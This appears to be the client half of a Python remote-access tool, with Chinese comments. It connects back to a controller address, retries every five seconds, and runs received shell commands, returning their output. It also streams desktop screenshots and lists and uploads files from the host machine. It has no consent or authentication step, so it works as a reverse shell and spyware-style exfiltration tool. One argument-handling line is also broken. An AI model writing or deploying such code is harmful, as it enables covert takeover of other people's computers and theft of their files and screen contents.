import socket
import subprocess
import os
import sys
import time
import json
import base64
import io
from PIL import ImageGrab


class RemoteClient:
    def __init__(self, host='127.0.0.1', port=9999):
        self.host = host
        self.port = port
        self.socket = None
        self.desktop_running = False

    def connect(self):
        while True:
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                print(f"[*] 正在连接 {self.host}:{self.port} ...")
                self.socket.connect((self.host, self.port))
                print("[+] 连接成功")
                self.handle_commands()
            except Exception as e:
                print(f"[-] 连接失败: {e}, 5秒后重试...")
                time.sleep(5)

    def send_json(self, data_dict):
        json_str = json.dumps(data_dict).encode('utf-8')
        header = len(json_str).to_bytes(4, 'big')
        self.socket.sendall(header + json_str)

    def recv_exact(self, num_bytes):
        data = bytearray()
        while len(data) < num_bytes:
            packet = self.socket.recv(num_bytes - len(data))
            if not packet:
                raise ConnectionError("Connection closed")
            data.extend(packet)
        return bytes(data)

    def handle_commands(self):
        while True:
            try:
                header = self.recv_exact(4)
                length = int.from_bytes(header, 'big')
                data = self.recv_exact(length)
                msg = json.loads(data.decode('utf-8'))

                msg_type = msg.get('type')

                if msg_type == 'exec_cmd':
                    self.execute_command(msg['data'])
                elif msg_type == 'start_desktop':
                    self.desktop_running = True
                    self.stream_desktop()
                elif msg_type == 'stop_desktop':
                    self.desktop_running = False
                elif msg_type == 'list_files':
                    self.list_files(msg['data'])
                elif msg_type == 'download_file':
                    self.download_file(msg['data'])

            except Exception as e:
                print(f"[-] 通信错误: {e}")
                break

        self.socket.close()

    def execute_command(self, cmd):
        try:
            # 使用 subprocess 执行命令
            result = subprocess.run(
                cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=30
            )
            output = result.stdout.decode('gbk', errors='replace') + result.stderr.decode('gbk', errors='replace')
            if not output:
                output = "Command executed successfully (no output)."
            self.send_json({'type': 'cmd_result', 'data': output})
        except Exception as e:
            self.send_json({'type': 'cmd_result', 'data': f"Error: {str(e)}"})

    def stream_desktop(self):
        """循环截屏并发送"""
        while self.desktop_running:
            try:
                screenshot = ImageGrab.grab()
                # 压缩为 JPEG 以减小体积
                buffer = io.BytesIO()
                screenshot.save(buffer, format="JPEG", quality=50)
                img_bytes = buffer.getvalue()

                # Base64 编码以便 JSON 传输
                b64_data = base64.b64encode(img_bytes).decode('utf-8')
                self.send_json({'type': 'desktop_frame', 'data': b64_data})

                time.sleep(0.5)  # 控制帧率，避免占用过高
            except Exception as e:
                print(f"Desktop stream error: {e}")
                break

    def list_files(self, path):
        try:
            if not os.path.exists(path):
                self.send_json({'type': 'file_list', 'data': [], 'path': path})
                return

            files = []
            for item in os.listdir(path):
                full_path = os.path.join(path, item)
                is_dir = os.path.isdir(full_path)
                size = "-" if is_dir else str(os.path.getsize(full_path))
                files.append({
                    'name': item,
                    'size': size,
                    'is_dir': is_dir
                })
            self.send_json({'type': 'file_list', 'data': files, 'path': path})
        except Exception as e:
            self.send_json({'type': 'file_list', 'data': [], 'path': path})
            print(f"List files error: {e}")

    def download_file(self, file_path):
        try:
            if os.path.isfile(file_path):
                with open(file_path, 'rb') as f:
                    content = f.read()
                b64_content = base64.b64encode(content).decode('utf-8')
                self.send_json({'type': 'file_download', 'path': file_path, 'data': b64_content})
            else:
                self.send_json({'type': 'file_download', 'path': file_path, 'data': ''})
        except Exception as e:
            print(f"Download error: {e}")


if __name__ == "__main__":
    # 默认连接本地，实际使用时修改 IP
    target_host = sys.argv if len(sys.argv) > 1 else '192.168.10.13'
    client = RemoteClient(host=target_host)
    client.connect()
